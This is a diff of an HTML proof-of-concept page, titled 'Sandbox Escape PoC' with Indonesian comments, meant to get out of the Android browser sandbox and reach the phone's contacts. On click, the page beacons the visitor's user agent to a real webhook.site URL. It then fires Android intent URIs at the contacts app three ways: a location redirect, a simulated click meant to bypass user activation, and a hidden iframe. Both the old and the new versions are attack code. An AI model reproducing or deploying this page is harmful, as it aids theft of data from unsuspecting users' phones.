@@ -1,57 +1,54 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Core Update</title></head>
-<body style="background:#000;color:#fa0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:4px solid #fa0;text-align:center;cursor:pointer;background:rgba(255,170,0,0.05);box-shadow:0 0 100px #fa0;border-radius:20px">
-        <h1 style="letter-spacing:10px;margin:0">V218_CONTACTS</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">PENETRATING_NATIVE_DB...</div>
-        <div style="font-size:11px;color:#555">[ TARGET: NATIVE_CONTACT_APP ]</div>
+<head><title>Sandbox Escape PoC</title></head>
+<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 100px #0f0;border-radius:50%">
+        <h1 style="letter-spacing:10px;margin:0">V219_ESCAPE</h1>
+        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">ESCAPING_BROWSER_SANDBOX...</div>
+        <div style="font-size:10px;color:#333">> TYPE: CROSS_APP_EXFILTRATION</div>
     </div>
 
 <script>
     const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
     document.getElementById('ignite').onclick = () => {
-        // 1. SILENT RECON
-        navigator.sendBeacon(`${webhook}?v=V218_STRIKE`, btoa(JSON.stringify({ts: Date.now(), model: "NATIVE_JUMP"})));
+        // 1. DATA RECON
+        navigator.sendBeacon(`${webhook}?v=V219_ESCAPE_ATTEMPT`, btoa(window.navigator.userAgent));
 
-        // 2. THE SYSTEM INTENTS (Mencoba 3 pintu masuk sekaligus)
-        
-        // Pintu 1: Daftar Kontak Utama (Android Open Source Project)
-        const target1 = "intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people/;package=com.android.contacts;end";
-        
-        // Pintu 2: Google Contacts (Untuk HP Pixel/Android terbaru)
-        const target2 = "intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people/;package=com.google.android.contacts;end";
+        // 2. THE ESCAPE PAYLOAD (Targeting Contacts via Deep Link)
+        // Kita menggunakan skema 'content://' yang dibungkus dalam Intent 
+        // untuk melihat apakah Chrome membiarkan URI internal bocor.
+        const escapeIntent = 
+            "intent:#Intent;" +
+            "action=android.intent.action.VIEW;" +
+            "data=content://com.android.contacts/contacts;" + 
+            "category=android.intent.category.BROWSABLE;" +
+            "package=com.android.contacts;" +
+            "S.browser_fallback_url=https://google.com;" + 
+            "end";
 
-        // Pintu 3: Contact Picker (Memaksa sistem memunculkan daftar pilih)
-        const target3 = "intent:#Intent;action=android.intent.action.PICK;type=vnd.android.cursor.dir/contact;end";
+        // 3. MULTI-VECTOR INJECTION
+        document.getElementById('status').innerText = "INJECTING_PAYLOAD...";
+        document.getElementById('status').style.color = "#f00";
 
-        // 3. AGGRESSIVE EXECUTION
-        document.getElementById('status').innerText = "EXECUTING_JUMP...";
+        // Vector 1: Location Override
+        window.location.assign(escapeIntent);
 
-        // Tembak semua secara simultan
-        window.location.href = target1;
+        // Vector 2: Click Simulation (Bypass User Activation)
+        const a = document.createElement('a');
+        a.href = escapeIntent;
+        a.rel = "noreferrer";
+        a.click();
 
-        setTimeout(() => {
-            window.location.href = target2;
-        }, 100);
-
-        setTimeout(() => {
-            const a = document.createElement('a');
-            a.href = target3;
-            a.click();
-        }, 300);
-
-        // 4. FALLBACK: Jika masih di browser, paksa lewat iframe
+        // Vector 3: Iframe Sandbox Busting
         setTimeout(() => {
             if (!document.hidden) {
                 const ifr = document.createElement('iframe');
                 ifr.style.display = 'none';
-                ifr.src = target1;
+                ifr.src = "intent:contacts#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=com.android.contacts;end";
                 document.body.appendChild(ifr);
-                document.getElementById('status').innerText = "RETRYING_VIA_IFRAME...";
             }
-        }, 700);
+        }, 500);
     };
 </script>
 </body>
